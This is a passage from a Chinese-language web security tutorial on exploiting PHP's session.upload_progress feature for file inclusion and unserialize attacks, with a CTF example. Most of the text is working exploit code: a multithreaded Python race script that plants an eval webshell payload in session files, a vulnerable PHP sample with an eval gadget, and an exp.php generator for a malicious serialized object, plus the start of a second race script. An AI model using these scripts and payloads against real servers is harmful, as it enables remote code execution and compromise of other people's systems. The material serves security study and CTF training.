<span class="cm-operator" style="color:rgb(152,26,26);">*</span> <span class="cm-number" style="color:rgb(17,102,68);">1024</span> <span class="cm-operator" style="color:rgb(152,26,26);">*</span> <span class="cm-number" style="color:rgb(17,102,68);">50</span>)</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-variable" style="color:rgb(0,0,0);">resp</span> = <span class="cm-variable" style="color:rgb(0,0,0);">session</span>.<span class="cm-property" style="color:rgb(0,0,0);">post</span>( <span class="cm-string" style="color:rgb(170,17,17);">\'http://127.0.0.1:5555/test56.php\'</span>, <span class="cm-variable" style="color:rgb(0,0,0);">data</span>={<span class="cm-string" style="color:rgb(170,17,17);">\'PHP_SESSION_UPLOAD_PROGRESS\'</span>: <span class="cm-string" style="color:rgb(170,17,17);">\'&lt;?php eval($_POST["cmd"]);?&gt;\'</span>}, <span class="cm-variable" style="color:rgb(0,0,0);">files</span>={<span class="cm-string" style="color:rgb(170,17,17);">\'file\'</span>: (<span class="cm-string" style="color:rgb(170,17,17);">\'tgao.txt\'</span>,<span class="cm-variable" style="color:rgb(0,0,0);">f</span>)}, <span class="cm-variable" style="color:rgb(0,0,0);">cookies</span>={<span class="cm-string" style="color:rgb(170,17,17);">\'PHPSESSID\'</span>: <span class="cm-variable" style="color:rgb(0,0,0);">sessid</span>} )</span><br><span style="padding-right:.1px;"><span class="cm-keyword" style="color:rgb(119,0,136);">def</span> <span class="cm-def" style="color:rgb(0,0,255);">read</span>(<span class="cm-variable" style="color:rgb(0,0,0);">session</span>):</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-keyword" style="color:rgb(119,0,136);">while</span> <span class="cm-keyword" style="color:rgb(119,0,136);">True</span>:</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-variable" style="color:rgb(0,0,0);">resp</span> = <span class="cm-variable" style="color:rgb(0,0,0);">session</span>.<span class="cm-property" style="color:rgb(0,0,0);">post</span>(<span class="cm-string" style="color:rgb(170,17,17);">\'http://127.0.0.1:5555/test56.php?file=session/sess_\'</span><span class="cm-operator" style="color:rgb(152,26,26);">+</span><span class="cm-variable" style="color:rgb(0,0,0);">sessid</span>,<span class="cm-variable" style="color:rgb(0,0,0);">data</span>=<span class="cm-variable" style="color:rgb(0,0,0);">data</span>)</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-keyword" style="color:rgb(119,0,136);">if</span> <span class="cm-string" style="color:rgb(170,17,17);">\'tgao.txt\'</span> <span class="cm-keyword" style="color:rgb(119,0,136);">in</span> <span class="cm-variable" style="color:rgb(0,0,0);">resp</span>.<span class="cm-property" style="color:rgb(0,0,0);">text</span>:</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-builtin" style="color:rgb(51,0,170);">print</span>(<span class="cm-variable" style="color:rgb(0,0,0);">resp</span>.<span class="cm-property" style="color:rgb(0,0,0);">text</span>)</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-variable" style="color:rgb(0,0,0);">event</span>.<span class="cm-property" style="color:rgb(0,0,0);">clear</span>()</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-keyword" style="color:rgb(119,0,136);">else</span>:</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-builtin" style="color:rgb(51,0,170);">print</span>(<span class="cm-string" style="color:rgb(170,17,17);">"[+++++++++++++]retry"</span>)</span><br><span style="padding-right:.1px;"><span class="cm-keyword" style="color:rgb(119,0,136);">if</span> <span class="cm-variable" style="color:rgb(0,0,0);">__name__</span>==<span class="cm-string" style="color:rgb(170,17,17);">"__main__"</span>:</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-variable" style="color:rgb(0,0,0);">event</span>=<span class="cm-variable" style="color:rgb(0,0,0);">threading</span>.<span class="cm-property" style="color:rgb(0,0,0);">Event</span>()</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-keyword" style="color:rgb(119,0,136);">with</span> <span class="cm-variable" style="color:rgb(0,0,0);">requests</span>.<span class="cm-property" style="color:rgb(0,0,0);">session</span>() <span class="cm-keyword" style="color:rgb(119,0,136);">as</span> <span class="cm-variable" style="color:rgb(0,0,0);">session</span>:</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-keyword" style="color:rgb(119,0,136);">for</span> <span class="cm-variable" style="color:rgb(0,0,0);">i</span> <span class="cm-keyword" style="color:rgb(119,0,136);">in</span> <span class="cm-variable" style="color:rgb(0,0,0);">xrange</span>(<span class="cm-number" style="color:rgb(17,102,68);">1</span>,<span class="cm-number" style="color:rgb(17,102,68);">30</span>): </span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-variable" style="color:rgb(0,0,0);">threading</span>.<span class="cm-property" style="color:rgb(0,0,0);">Thread</span>(<span class="cm-variable" style="color:rgb(0,0,0);">target</span>=<span class="cm-variable" style="color:rgb(0,0,0);">write</span>,<span class="cm-variable" style="color:rgb(0,0,0);">args</span>=(<span class="cm-variable" style="color:rgb(0,0,0);">session</span>,)).<span class="cm-property" style="color:rgb(0,0,0);">start</span>()</span><br><span style="padding-right:.1px;"><span>​</span></span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-keyword" style="color:rgb(119,0,136);">for</span> <span class="cm-variable" style="color:rgb(0,0,0);">i</span> <span class="cm-keyword" style="color:rgb(119,0,136);">in</span> <span class="cm-variable" style="color:rgb(0,0,0);">xrange</span>(<span class="cm-number" style="color:rgb(17,102,68);">1</span>,<span class="cm-number" style="color:rgb(17,102,68);">30</span>):</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-variable" style="color:rgb(0,0,0);">threading</span>.<span class="cm-property" style="color:rgb(0,0,0);">Thread</span>(<span class="cm-variable" style="color:rgb(0,0,0);">target</span>=<span class="cm-variable" style="color:rgb(0,0,0);">read</span>,<span class="cm-variable" style="color:rgb(0,0,0);">args</span>=(<span class="cm-variable" style="color:rgb(0,0,0);">session</span>,)).<span class="cm-property" style="color:rgb(0,0,0);">start</span>()</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-variable" style="color:rgb(0,0,0);">event</span>.<span class="cm-property" style="color:rgb(0,0,0);">set</span>()</span></code></pre><p>效果如下图</p><p><img alt="利用session.upload_progress进行文件包含和反序列化渗透" src="https://image.3001.net/images/20190506/1557146857_5cd02ce98fe81.png!small" height="201" width="690"></p><h3>ctf题目</h3><p>在最近，全国大学生信息安全竞赛中有一题justsoso,其中一个页面的代码如下。</p><pre><code><span style="padding-right:.1px;"><span class="cm-operator" style="color:rgb(152,26,26);">&lt;</span><span class="cm-variable" style="color:rgb(0,0,0);">html</span><span class="cm-operator" style="color:rgb(152,26,26);">&gt;</span></span><br><span style="padding-right:.1px;"> &nbsp; &nbsp;<span class="cm-operator" style="color:rgb(152,26,26);">&lt;?</span><span class="cm-variable" style="color:rgb(0,0,0);">php</span></span><br><span style="padding-right:.1px;"> &nbsp; &nbsp;<span class="cm-builtin" style="color:rgb(51,0,170);">error_reporting</span>(<span class="cm-number" style="color:rgb(17,102,68);">0</span>);</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp;<span class="cm-variable-2" style="color:rgb(0,85,170);">$file</span> <span class="cm-operator" style="color:rgb(152,26,26);">=</span> <span class="cm-variable-2" style="color:rgb(0,85,170);">$_GET</span>[<span class="cm-string" style="color:rgb(170,17,17);">"file"</span>];</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp;<span class="cm-variable-2" style="color:rgb(0,85,170);">$payload</span> <span class="cm-operator" style="color:rgb(152,26,26);">=</span> <span class="cm-variable-2" style="color:rgb(0,85,170);">$_GET</span>[<span class="cm-string" style="color:rgb(170,17,17);">"payload"</span>];</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp;<span class="cm-keyword" style="color:rgb(119,0,136);">if</span>(<span class="cm-operator" style="color:rgb(152,26,26);">!</span><span class="cm-keyword" style="color:rgb(119,0,136);">isset</span>(<span class="cm-variable-2" style="color:rgb(0,85,170);">$file</span>)){</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword" style="color:rgb(119,0,136);">echo</span> <span class="cm-string" style="color:rgb(170,17,17);">\'Missing parameter\'</span>.<span class="cm-string" style="color:rgb(170,17,17);">\'&lt;br&gt;\'</span>;</span><br><span style="padding-right:.1px;"> &nbsp;  }</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp;<span class="cm-keyword" style="color:rgb(119,0,136);">if</span>(<span class="cm-builtin" style="color:rgb(51,0,170);">preg_match</span>(<span class="cm-string" style="color:rgb(170,17,17);">"/flag/"</span>,<span class="cm-variable-2" style="color:rgb(0,85,170);">$file</span>)){</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword" style="color:rgb(119,0,136);">die</span>(<span class="cm-string" style="color:rgb(170,17,17);">\'hack attacked!!!\'</span>);</span><br><span style="padding-right:.1px;"> &nbsp;  }</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp;<span class="cm-variable" style="color:rgb(0,0,0);">@include</span>(<span class="cm-variable-2" style="color:rgb(0,85,170);">$file</span>);</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp;<span class="cm-keyword" style="color:rgb(119,0,136);">if</span>(<span class="cm-keyword" style="color:rgb(119,0,136);">isset</span>(<span class="cm-variable-2" style="color:rgb(0,85,170);">$payload</span>)){</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2" style="color:rgb(0,85,170);">$url</span> <span class="cm-operator" style="color:rgb(152,26,26);">=</span> <span class="cm-builtin" style="color:rgb(51,0,170);">parse_url</span>(<span class="cm-variable-2" style="color:rgb(0,85,170);">$_SERVER</span>[<span class="cm-string" style="color:rgb(170,17,17);">\'REQUEST_URI\'</span>]);</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-builtin" style="color:rgb(51,0,170);">parse_str</span>(<span class="cm-variable-2" style="color:rgb(0,85,170);">$url</span>[<span class="cm-string" style="color:rgb(170,17,17);">\'query\'</span>],<span class="cm-variable-2" style="color:rgb(0,85,170);">$query</span>);</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword" style="color:rgb(119,0,136);">foreach</span>(<span class="cm-variable-2" style="color:rgb(0,85,170);">$query</span> <span class="cm-keyword" style="color:rgb(119,0,136);">as</span> <span class="cm-variable-2" style="color:rgb(0,85,170);">$value</span>){</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword" style="color:rgb(119,0,136);">if</span> (<span class="cm-builtin" style="color:rgb(51,0,170);">preg_match</span>(<span class="cm-string" style="color:rgb(170,17,17);">"/flag/"</span>,<span class="cm-variable-2" style="color:rgb(0,85,170);">$value</span>)) {</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword" style="color:rgb(119,0,136);">die</span>(<span class="cm-string" style="color:rgb(170,17,17);">\'stop hacking!\'</span>);</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword" style="color:rgb(119,0,136);">exit</span>();</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  }</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp; &nbsp;  }</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2" style="color:rgb(0,85,170);">$payload</span> <span class="cm-operator" style="color:rgb(152,26,26);">=</span> <span class="cm-builtin" style="color:rgb(51,0,170);">unserialize</span>(<span class="cm-variable-2" style="color:rgb(0,85,170);">$payload</span>);</span><br><span style="padding-right:.1px;"> &nbsp;  }<span class="cm-keyword" style="color:rgb(119,0,136);">else</span>{</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp; &nbsp; <span class="cm-keyword" style="color:rgb(119,0,136);">echo</span> <span class="cm-string" style="color:rgb(170,17,17);">"Missing parameters"</span>;</span><br><span style="padding-right:.1px;"> &nbsp;  }</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp;<span class="cm-operator" style="color:rgb(152,26,26);">?&gt;</span></span><br><span style="padding-right:.1px;"> &nbsp; &nbsp;<span class="cm-operator" style="color:rgb(152,26,26);">&lt;!--</span><span class="cm-variable" style="color:rgb(0,0,0);">Please</span> <span class="cm-variable" style="color:rgb(0,0,0);">test</span> <span class="cm-variable" style="color:rgb(0,0,0);">index</span>.<span class="cm-variable" style="color:rgb(0,0,0);">php</span><span class="cm-operator" style="color:rgb(152,26,26);">?</span><span class="cm-builtin" style="color:rgb(51,0,170);">file</span><span class="cm-operator" style="color:rgb(152,26,26);">=</span><span class="cm-variable" style="color:rgb(0,0,0);">xxx</span>.<span class="cm-variable" style="color:rgb(0,0,0);">php</span> <span class="cm-operator" style="color:rgb(152,26,26);">--&gt;</span></span><br><span style="padding-right:.1px;"> &nbsp; &nbsp;<span class="cm-operator" style="color:rgb(152,26,26);">&lt;!--</span><span class="cm-variable" style="color:rgb(0,0,0);">Please</span> <span class="cm-variable" style="color:rgb(0,0,0);">get</span> <span class="cm-variable" style="color:rgb(0,0,0);">the</span> <span class="cm-variable" style="color:rgb(0,0,0);">source</span> <span class="cm-variable" style="color:rgb(0,0,0);">of</span> <span class="cm-variable" style="color:rgb(0,0,0);">hint</span>.<span class="cm-variable" style="color:rgb(0,0,0);">php</span><span class="cm-operator" style="color:rgb(152,26,26);">--&gt;</span></span><br><span style="padding-right:.1px;"> &nbsp; &nbsp;<span class="cm-operator" style="color:rgb(152,26,26);">&lt;/</span><span class="cm-variable" style="color:rgb(0,0,0);">html</span><span class="cm-operator" style="color:rgb(152,26,26);">&gt;</span></span></code></pre><p>在代码前几行可以看到，场景和前面的示例代码类似，只不过对变量<code>$file</code>加了过滤，不过没什么影响。</p><p>利用思路一样，这里就不再说了，网上也有相应的解法。</p><h3>小结</h3><p><b>利用条件</b></p><blockquote>    <p>1. 存在文件包含漏洞</p>    <p>2. 知道session文件存放路径，可以尝试默认路径</p>    <p>3. 具有读取和写入session文件的权限</p></blockquote><h2>利用session.upload_progress进行反序列化攻击</h2><h3>测试环境</h3><blockquote>    <p>php5.5.38</p>    <p>win10</p>    <p><code>session.serialize_handler=php_serialize</code><span style="color: rgb(51, 51, 51);">，其余session相关配置为默认值</span></p></blockquote><h3>示例代码</h3><pre><code><span style="padding-right:.1px;"><span class="cm-operator" style="color:rgb(152,26,26);">&lt;?</span><span class="cm-variable" style="color:rgb(0,0,0);">php</span></span><br><span style="padding-right:.1px;"><span class="cm-builtin" style="color:rgb(51,0,170);">error_reporting</span>(<span class="cm-number" style="color:rgb(17,102,68);">0</span>);</span><br><span style="padding-right:.1px;"><span class="cm-variable" style="color:rgb(0,0,0);">date_default_timezone_set</span>(<span class="cm-string" style="color:rgb(170,17,17);">"Asia/Shanghai"</span>);</span><br><span style="padding-right:.1px;"><span class="cm-builtin" style="color:rgb(51,0,170);">ini_set</span>(<span class="cm-string" style="color:rgb(170,17,17);">\'session.serialize_handler\'</span>,<span class="cm-string" style="color:rgb(170,17,17);">\'php\'</span>);</span><br><span style="padding-right:.1px;"><span class="cm-builtin" style="color:rgb(51,0,170);">session_start</span>();</span><br><span style="padding-right:.1px;"><span class="cm-keyword" style="color:rgb(119,0,136);">class</span> <span class="cm-def" style="color:rgb(0,0,255);">Door</span>{</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp;<span class="cm-keyword" style="color:rgb(119,0,136);">public</span> <span class="cm-variable-2" style="color:rgb(0,85,170);">$handle</span>;</span><br><span style="padding-right:.1px;"><span>​</span></span><br><span style="padding-right:.1px;"> &nbsp; &nbsp;<span class="cm-keyword" style="color:rgb(119,0,136);">function</span> <span class="cm-def" style="color:rgb(0,0,255);">__construct</span>() {</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2" style="color:rgb(0,85,170);">$this</span><span class="cm-operator" style="color:rgb(152,26,26);">-&gt;</span><span class="cm-variable" style="color:rgb(0,0,0);">handle</span><span class="cm-operator" style="color:rgb(152,26,26);">=</span><span class="cm-keyword" style="color:rgb(119,0,136);">new</span> <span class="cm-variable" style="color:rgb(0,0,0);">TimeNow</span>();</span><br><span style="padding-right:.1px;"> &nbsp;  }</span><br><span style="padding-right:.1px;"><span>​</span></span><br><span style="padding-right:.1px;"> &nbsp; &nbsp;<span class="cm-keyword" style="color:rgb(119,0,136);">function</span> <span class="cm-def" style="color:rgb(0,0,255);">__destruct</span>() {</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2" style="color:rgb(0,85,170);">$this</span><span class="cm-operator" style="color:rgb(152,26,26);">-&gt;</span><span class="cm-variable" style="color:rgb(0,0,0);">handle</span><span class="cm-operator" style="color:rgb(152,26,26);">-&gt;</span><span class="cm-variable" style="color:rgb(0,0,0);">action</span>();</span><br><span style="padding-right:.1px;"> &nbsp;  }</span><br><span style="padding-right:.1px;">}</span><br><span style="padding-right:.1px;"><span class="cm-keyword" style="color:rgb(119,0,136);">class</span> <span class="cm-def" style="color:rgb(0,0,255);">TimeNow</span> {</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp;<span class="cm-keyword" style="color:rgb(119,0,136);">function</span> <span class="cm-def" style="color:rgb(0,0,255);">action</span>() {</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword" style="color:rgb(119,0,136);">echo</span> <span class="cm-string" style="color:rgb(170,17,17);">"你的访问时间:"</span>.<span class="cm-string" style="color:rgb(170,17,17);">"</span> &nbsp;<span class="cm-string" style="color:rgb(170,17,17);">"</span>.<span class="cm-builtin" style="color:rgb(51,0,170);">date</span>(<span class="cm-string" style="color:rgb(170,17,17);">\'Y-m-d H:i:s\'</span>,<span class="cm-builtin" style="color:rgb(51,0,170);">time</span>());</span><br><span style="padding-right:.1px;"> &nbsp;  }</span><br><span style="padding-right:.1px;">}</span><br><span style="padding-right:.1px;"><span class="cm-keyword" style="color:rgb(119,0,136);">class</span> &nbsp;<span class="cm-def" style="color:rgb(0,0,255);">IP</span>{</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp;<span class="cm-keyword" style="color:rgb(119,0,136);">public</span> <span class="cm-variable-2" style="color:rgb(0,85,170);">$ip</span>;</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-keyword" style="color:rgb(119,0,136);">function</span> <span class="cm-def" style="color:rgb(0,0,255);">__construct</span>() {</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2" style="color:rgb(0,85,170);">$this</span><span class="cm-operator" style="color:rgb(152,26,26);">-&gt;</span><span class="cm-variable" style="color:rgb(0,0,0);">ip</span> <span class="cm-operator" style="color:rgb(152,26,26);">=</span> <span class="cm-string" style="color:rgb(170,17,17);">\'echo $_SERVER["REMOTE_ADDR"];\'</span>;</span><br><span style="padding-right:.1px;"> &nbsp;  }</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp;<span class="cm-keyword" style="color:rgb(119,0,136);">function</span> <span class="cm-def" style="color:rgb(0,0,255);">action</span>() {</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword" style="color:rgb(119,0,136);">eval</span>(<span class="cm-variable-2" style="color:rgb(0,85,170);">$this</span><span class="cm-operator" style="color:rgb(152,26,26);">-&gt;</span><span class="cm-variable" style="color:rgb(0,0,0);">ip</span>);</span><br><span style="padding-right:.1px;"> &nbsp;  }</span><br><span style="padding-right:.1px;">}</span><br><span style="padding-right:.1px;"><span class="cm-operator" style="color:rgb(152,26,26);">?&gt;</span></span></code></pre><h3>分析</h3><p><b>问题一</b></p><p>整个代码没有参数可控的地方。通过什么方法来进行反序列化利用呢</p><p><b>解答一</b></p><p>这里，利用<code>PHP_SESSION_UPLOAD_PROGRESS</code>上传文件，其中利用文件名可控，从而构造恶意序列化语句并写入session文件。</p><p>另外，与文件包含利用一样，也需要进行竞争。</p><h3>利用脚本</h3><p>首先利用exp.php脚本构造恶意序列化语句</p><pre><code><br><span style="padding-right:.1px;"><span class="cm-operator" style="color:rgb(152,26,26);">&lt;?</span><span class="cm-variable" style="color:rgb(0,0,0);">php</span></span><br><span style="padding-right:.1px;"><span class="cm-builtin" style="color:rgb(51,0,170);">ini_set</span>(<span class="cm-string" style="color:rgb(170,17,17);">\'session.serialize_handler\'</span>, <span class="cm-string" style="color:rgb(170,17,17);">\'php_serialize\'</span>);</span><br><span style="padding-right:.1px;"><span class="cm-builtin" style="color:rgb(51,0,170);">session_start</span>();</span><br><span style="padding-right:.1px;"><span class="cm-keyword" style="color:rgb(119,0,136);">class</span> <span class="cm-def" style="color:rgb(0,0,255);">Door</span>{</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp;<span class="cm-keyword" style="color:rgb(119,0,136);">public</span> <span class="cm-variable-2" style="color:rgb(0,85,170);">$handle</span>;</span><br><span style="padding-right:.1px;"><span>​</span></span><br><span style="padding-right:.1px;"> &nbsp; &nbsp;<span class="cm-keyword" style="color:rgb(119,0,136);">function</span> <span class="cm-def" style="color:rgb(0,0,255);">__construct</span>() {</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2" style="color:rgb(0,85,170);">$this</span><span class="cm-operator" style="color:rgb(152,26,26);">-&gt;</span><span class="cm-variable" style="color:rgb(0,0,0);">handle</span> <span class="cm-operator" style="color:rgb(152,26,26);">=</span> <span class="cm-keyword" style="color:rgb(119,0,136);">new</span> <span class="cm-variable" style="color:rgb(0,0,0);">IP</span>();</span><br><span style="padding-right:.1px;"> &nbsp;  }</span><br><span style="padding-right:.1px;"><span>​</span></span><br><span style="padding-right:.1px;"> &nbsp; &nbsp;<span class="cm-keyword" style="color:rgb(119,0,136);">function</span> <span class="cm-def" style="color:rgb(0,0,255);">__destruct</span>() {</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2" style="color:rgb(0,85,170);">$this</span><span class="cm-operator" style="color:rgb(152,26,26);">-&gt;</span><span class="cm-variable" style="color:rgb(0,0,0);">handle</span><span class="cm-operator" style="color:rgb(152,26,26);">-&gt;</span><span class="cm-variable" style="color:rgb(0,0,0);">action</span>();</span><br><span style="padding-right:.1px;"> &nbsp;  }</span><br><span style="padding-right:.1px;">}</span><br><span style="padding-right:.1px;"><span class="cm-keyword" style="color:rgb(119,0,136);">class</span> <span class="cm-def" style="color:rgb(0,0,255);">TimeNow</span> {</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp;<span class="cm-keyword" style="color:rgb(119,0,136);">function</span> <span class="cm-def" style="color:rgb(0,0,255);">action</span>() {</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword" style="color:rgb(119,0,136);">echo</span> <span class="cm-string" style="color:rgb(170,17,17);">"你的访问时间:"</span>.<span class="cm-string" style="color:rgb(170,17,17);">"</span> &nbsp;<span class="cm-string" style="color:rgb(170,17,17);">"</span>.<span class="cm-builtin" style="color:rgb(51,0,170);">date</span>(<span class="cm-string" style="color:rgb(170,17,17);">\'Y-m-d H:i:s\'</span>,<span class="cm-builtin" style="color:rgb(51,0,170);">time</span>());</span><br><span style="padding-right:.1px;"> &nbsp;  }</span><br><span style="padding-right:.1px;">}</span><br><span style="padding-right:.1px;"><span>​</span></span><br><span style="padding-right:.1px;"><span class="cm-keyword" style="color:rgb(119,0,136);">class</span> &nbsp;<span class="cm-def" style="color:rgb(0,0,255);">IP</span>{</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp;<span class="cm-keyword" style="color:rgb(119,0,136);">public</span> <span class="cm-variable-2" style="color:rgb(0,85,170);">$ip</span>;</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-keyword" style="color:rgb(119,0,136);">function</span> <span class="cm-def" style="color:rgb(0,0,255);">__construct</span>() {</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-comment" style="color:rgb(170,85,0);">//$this-&gt;ip=\'payload\';</span></span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-variable-2" style="color:rgb(0,85,170);">$this</span><span class="cm-operator" style="color:rgb(152,26,26);">-&gt;</span><span class="cm-variable" style="color:rgb(0,0,0);">ip</span><span class="cm-operator" style="color:rgb(152,26,26);">=</span><span class="cm-string" style="color:rgb(170,17,17);">\'phpinfo();\'</span>;</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-tab">    </span><span class="cm-comment" style="color:rgb(170,85,0);">//$this-&gt;ip=\'print_r(scandir(\'/\'));\';</span></span><br><span style="padding-right:.1px;"> &nbsp;  }</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp;<span class="cm-keyword" style="color:rgb(119,0,136);">function</span> <span class="cm-def" style="color:rgb(0,0,255);">action</span>() {</span><br><span style="padding-right:.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword" style="color:rgb(119,0,136);">eval</span>(<span class="cm-variable-2" style="color:rgb(0,85,170);">$this</span><span class="cm-operator" style="color:rgb(152,26,26);">-&gt;</span><span class="cm-variable" style="color:rgb(0,0,0);">ip</span>);</span><br><span style="padding-right:.1px;"> &nbsp;  }</span><br><span style="padding-right:.1px;">}</span><br><span style="padding-right:.1px;"><span class="cm-variable-2" style="color:rgb(0,85,170);">$a</span><span class="cm-operator" style="color:rgb(152,26,26);">=</span><span class="cm-keyword" style="color:rgb(119,0,136);">new</span> <span class="cm-variable" style="color:rgb(0,0,0);">Door</span>();</span><br><span style="padding-right:.1px;"><span class="cm-variable-2" style="color:rgb(0,85,170);">$b</span><span class="cm-operator" style="color:rgb(152,26,26);">=</span><span class="cm-builtin" style="color:rgb(51,0,170);">serialize</span>(<span class="cm-variable-2" style="color:rgb(0,85,170);">$a</span>);</span><br><span style="padding-right:.1px;"><span class="cm-variable-2" style="color:rgb(0,85,170);">$c</span><span class="cm-operator" style="color:rgb(152,26,26);">=</span><span class="cm-builtin" style="color:rgb(51,0,170);">addslashes</span>(<span class="cm-variable-2" style="color:rgb(0,85,170);">$b</span>);</span><br><span style="padding-right:.1px;"><span class="cm-variable-2" style="color:rgb(0,85,170);">$d</span><span class="cm-operator" style="color:rgb(152,26,26);">=</span><span class="cm-builtin" style="color:rgb(51,0,170);">str_replace</span>(<span class="cm-string" style="color:rgb(170,17,17);">"O:4:"</span>,<span class="cm-string" style="color:rgb(170,17,17);">"|O:4:"</span>,<span class="cm-variable-2" style="color:rgb(0,85,170);">$c</span>);</span><br><span style="padding-right:.1px;"><span class="cm-keyword" style="color:rgb(119,0,136);">echo</span> <span class="cm-variable-2" style="color:rgb(0,85,170);">$d</span>;</span><br><span style="padding-right:.1px;"><span class="cm-operator" style="color:rgb(152,26,26);">?&gt;</span></span></code></pre><p>其此利用exp.py脚本进行竞争</p><pre><code><span style="padding-right:.1px;"><span class="cm-comment" style="color:rgb(170,85,0);">#coding=utf-8</span></span><br><span style="padding-right:.1px;"><span class="cm-keyword" style="color:rgb(119,0,136);">import</span> <span class="cm-variable" style="color:rgb(0,0,0);">requests</span></span><br><span style="padding-right:.1px;"><span class="cm-keyword" style="color:rgb(119,0,136);">import</span> <span class="cm-variable" style="color:rgb(0,0,0);">threading</span></span><br><span style="padding-right:.1px;"><span class="cm-keyword" style="color:rgb(119,0,136);">import</span> <span class="cm-variable" style="color:rgb(0,0,0);">io</span></span><br><span style="padding-right:.1px;"><span class="cm-keyword" style="color:rgb(119,0,136);">import</span> <span class="cm-variable" style="color:rgb(0,0,0);">sys</span></span><br><span style="padding-right:.1px;"><span>​</span></span><br><span style="padding-right:.1px;"><span class="cm-keyword" style="color:rgb(119,0,136);">def</span> <span class="cm-def" style="color:rgb(0,0,255);">exp</span>(<span class="cm-variable" style="color:rgb(0,0,0);">ip</span>,<span class="cm-variable" style="color:rgb(0,0,0);">port</span>):</span><br><span class="cm-tab-wrap-hack" style="padding-right:.1px;"><span class="cm-tab">    </span></span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-variable" style="color:rgb(0,0,0);">f</span> = <span class="cm-variable" style="color:rgb(0,0,0);">io</span>.<span class="cm-property" style="color:rgb(0,0,0);">BytesIO</span>(<span class="cm-string" style="color:rgb(170,17,17);">b\'a\'</span> <span class="cm-operator" style="color:rgb(152,26,26);">*</span> <span class="cm-number" style="color:rgb(17,102,68);">1024</span> <span class="cm-operator" style="color:rgb(152,26,26);">*</span><span class="cm-number" style="color:rgb(17,102,68);">1024</span><span class="cm-operator" style="color:rgb(152,26,26);">*</span><span class="cm-number" style="color:rgb(17,102,68);">1</span>)</span><br><span style="padding-right:.1px;"><span class="cm-tab">    </span><span class="cm-keyword" style="color:rgb(119,0,136);">while</span> <span class="cm-keyword" 